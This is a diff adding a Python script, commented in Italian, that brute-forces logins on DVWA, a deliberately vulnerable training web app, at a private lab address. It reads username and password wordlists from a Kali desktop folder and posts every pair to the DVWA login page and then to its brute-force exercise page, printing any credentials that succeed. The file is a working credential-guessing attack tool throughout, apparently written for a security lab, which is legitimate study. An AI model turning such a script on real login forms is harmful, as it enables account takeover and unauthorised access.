@@ -1,0 +1,50 @@
+import requests
+import urllib.parse
+import http.client
+
+username_file = '/home/kali/Desktop/brute/usernames.txt'
+password_file = '/home/kali/Desktop/brute/password.txt'
+numerotentativi= 0
+
+with open(username_file, 'r') as usernames:
+	with open(password_file, 'r') as passwords:
+		# Leggi tutti gli usernames e le passwords in due liste separate
+		username_list = usernames.readlines()
+		password_list = passwords.readlines()
+		
+		for username in username_list :
+			for password in password_list:
+				username = username.strip()
+				password = password.strip()
+			
+				password = password.rstrip()
+				post_parameters =urllib.parse.urlencode({'username': username, 'password': password,'Login':'Login'})
+				headers = {'Content-Type': 'application/x-www-form-urlencoded', "Accept": "text/html,application/xhtml+xml"}
+				conn = http.client.HTTPConnection('192.168.50.101', 80)
+				conn.request('POST', '/dvwa/login.php', post_parameters , headers)
+
+				response = conn.getresponse()
+
+				numerotentativi=numerotentativi+1
+				new_location=response.getheader('Location')
+				
+				if new_location != "login.php":
+					print('Login riuscito al portale DVWA con',numerotentativi,"tentativi")
+					print('Accesso riuscito -->',username,'-',password,"\n\n")
+					numerotentativi= 0
+					for username in username_list :
+						for password in password_list:
+							username = username.strip()
+							password = password.strip()
+					
+							url1 = 'http://192.168.50.101/dvwa/vulnerabilities/brute/' 
+							response = requests.post(url1, data = {'username': username, 'password': password,'Login':'Login'}, allow_redirects=False)
+							result = response.headers['Location']
+							numerotentativi=numerotentativi+1
+							print(result)
+							
+							if "http://192.168.50.101/dvwa/vulnerabilities/brute/?username=admin&password=passwo&Login=Login#" not in result: 
+								print('Accesso riuscito -->',username,'-',password)
+								exit()
+							else:
+								print('Accesso non riuscito -->',username,'-',password)
